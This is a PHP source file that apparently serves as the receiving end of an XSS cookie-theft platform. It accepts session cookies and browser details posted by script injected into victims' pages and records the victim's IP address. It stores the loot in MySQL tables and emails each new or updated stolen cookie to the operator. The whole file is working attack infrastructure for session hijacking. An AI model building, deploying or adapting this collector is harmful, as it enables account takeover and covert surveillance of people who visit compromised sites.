<?php

/**
 * @author: xiaoma
 * @blog  : www.i0day.com
 * @date  : 2014.10.11 22:30
 */
 header("Content-type: text/html; charset=utf-8");
 date_default_timezone_set('PRC');
 require_once './config/mysql_conn.php';
  require_once './config/function_ip.php';
   include('mail.php');
 //include('mail.php');
$url=htmlspecialchars(addslashes('http://'.$_POST['d']));
$cookie=htmlspecialchars(addslashes($_POST['c']));
$title=htmlspecialchars(addslashes($_POST['t']));
$plug=htmlspecialchars(addslashes($_POST['plug']));
$flash=htmlspecialchars(addslashes($_POST['flash']));
$screen=htmlspecialchars(addslashes($_POST['screen']));
$Device=htmlspecialchars(addslashes($_POST['Device']));
$cpu=htmlspecialchars(addslashes($_POST['cpu']));
$domain=base64_encode(htmlspecialchars(addslashes($_POST['domain'])));
$netip=htmlspecialchars(addslashes($_POST['netip']));
$referrer=htmlspecialchars(addslashes($_POST['referrer']));
$browser = htmlspecialchars(addslashes($_POST['browser']));//浏览器： 
$ip =base64_encode(htmlspecialchars(addslashes(getIP())));//IP地址： 
$os = htmlspecialchars(addslashes($_POST['os']));//操作系统：
$language=lang();//浏览器语言
$time = date('Y-m-d H:i:s', time());
$project=mysql_query("SELECT * FROM `pxss_project` WHERE `project_domain`='{$domain}' AND `project_ip`='{$ip}'");
$mail=mysql_query("SELECT * FROM `pxss_userinfo` WHERE `id`=1");
$mail_res=mysql_fetch_array($mail);
if(!is_array($pro_res=mysql_fetch_array($project))){
mysql_query("INSERT INTO `pxss_project` (`pid`, `project_domain`, `project_ip`,`project_browser`,`project_os`,`project_device`, `datetime`) VALUES (NULL,'{$domain}','{$ip}','{$browser}','{$os}','{$Device}','{$time}')");
mysql_query("INSERT INTO `pxss_cookie` (`id`, `cookie_domain`, `cookie_ip`, `cookie`, `title`, `url`, `refrerer`, `browser`, `language`, `os`, `screen`, `getplugin`, `flash`, `cpu`, `device`, `datetime`) VALUES (NULL, '{$domain}', '{$ip}', '{$cookie}', '{$title}', '{$url}', '{$referrer}', '{$browser}', '{$language}', '{$os}', '{$screen}', '{$plug}', '{$flash}', '{$cpu}',  '{$Device}', '{$time}')");

$mail_connect="URL:".base64_decode($domain)."</br>".base64_decode($ip)."</br>".$title."</br>".$url."</br>".$referrer."</br>".$cookie."</br>".$browser."</br>".$language."</br>".$os."</br>".$time."</br>";
smtp_mail($mail_res['email'], "新COOKIE——>{$time}", $mail_connect);

}else{
    $update="UPDATE `pxss_cookie` SET `cookie` = '{$cookie}', `title` = '{$title}', `url` = '{$url}', `refrerer` = '{$referrer}', `browser` = '{$browser}', `language` = '{$language}', `os` = '{$os}', `screen` = '{$screen}', `getplugin` = '{$plug}', `flash` = '{$flash}', `cpu` = '{$cpu}', `device` = '{$Device}', `datetime` = '{$time}' WHERE `cookie_domain`='{$domain}' AND `cookie_ip`='{$ip}'";
    mysql_query($update);
$mail_connect="URL:".base64_decode($domain)."</br>".base64_decode($ip)."</br>".$title."</br>".$url."</br>".$referrer."</br>".$cookie."</br>".$browser."</br>".$language."</br>".$os."</br>".$time."</br>";
	smtp_mail($mail_res['email'], "有更新COOKIE——>{$time}", $mail_connect);
}


?>